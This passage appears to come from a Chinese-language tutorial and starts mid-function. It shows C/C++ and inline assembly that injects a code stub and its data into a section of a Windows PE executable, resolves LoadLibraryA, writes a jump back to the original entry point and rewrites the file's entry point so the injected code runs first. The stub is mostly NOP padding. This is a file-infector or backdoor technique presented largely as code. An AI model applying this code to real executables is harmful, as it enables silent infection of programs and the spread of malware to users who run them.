
```
(&LoadPeFile,pSectionHeader.VirtualAddress+15,&Kernel32,sizeof(Kernel32));

pKernel32=(PKERNEL32DLL)LoadPeFile.ImageRvaToVa
(pSectionHeader.VirtualAddress+15);

CopyMemory(pKernel32,&Kernel32,sizeof(KERNEL32DLL));

pKernel32=(PKERNEL32DLL)LoadPeFile.ImageRvaToVa
(pSectionHeader.VirtualAddress+15);

//
//这里好像重复了，但是请原谅，看电脑久了，头晕了，不改了，不知道的自己调试

memcpy((PVOID)((DWORD)(pFun)+Size),Data,DataSize);

memcpy(pFun,&EntryPoint,((DWORD)&End-(DWORD)&EntryPoint));

memcpy((PVOID)((DWORD)(pFun)+((DWORD)&End-(DWORD)
&EntryPoint)),pEntryPoint,EntryPointSize);

Kernel32.LoadLibrary=GetImportDirectoryFunction
(&LoadPeFile,"LoadLibraryA","Kernel32.dll");

memcpy((PVOID)((DWORD)(pFun)+15),&Kernel32,sizeof
(Kernel32));

//        \_asm call pFun

makejmp((PVOID)((DWORD)pSectionHeader.VirtualAddress+5),(PVOID)
LoadPeFile.GetNtHeaders()->OptionalHeader.AddressOfEntryPoint,(PVOID)((DWORD)
pFun+5),
&Rav);//用来生成跳回原来入口点指令的函数

CopyDataToPeFile
(&LoadPeFile,pSectionHeader.VirtualAddress,pFun,Size+DataSize);//将所有代码写入文件

CopyDataToPeFile
(&LoadPeFile,pSectionHeader.VirtualAddress+Size,Data,DataSize);//将所有全局变量写入
文件

LoadPeFile.GetNtHeaders()-
>OptionalHeader.AddressOfEntryPoint=pSectionHeader.VirtualAddress;//修改入口点

pKernel32=(PKERNEL32DLL)LoadPeFile.ImageRvaToVa
(pSectionHeader.VirtualAddress+15);//测试用的，主要是看一下写入的数据结构是否正确，
前面我写数据的，时候，结构一直不正确，弄得我很头晕，所以我就加上了这个测试

LoadPeFile.CloseFile();//关闭映射，将内存中的未写入磁盘的内容写入磁盘

free(pFun);

return TRUE;

}
```

下面我讲一下入口函数的构成，其余的请看代码

```
\_\_declspec(naked) void \_stdcall EntryPoint()
{
        \_asm
        {
                call GetAddressAndCall //调用函数，取得Kernel32变量的指针
                        nop               //这里用来容纳一个JMP指令
                        nop               //这个指令是用来
                        nop               //跳回原来入口点
                        nop               //用的
                        nop               //
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop                   //Kernel32变量应该在这个位置，它在内
存中的位置为 EntryPoint + 15
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop                     //这里为什么要写这么多的NOP指令呢？
主要是填充用的，确保能够容下Kernel32结构
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
        }
}
```
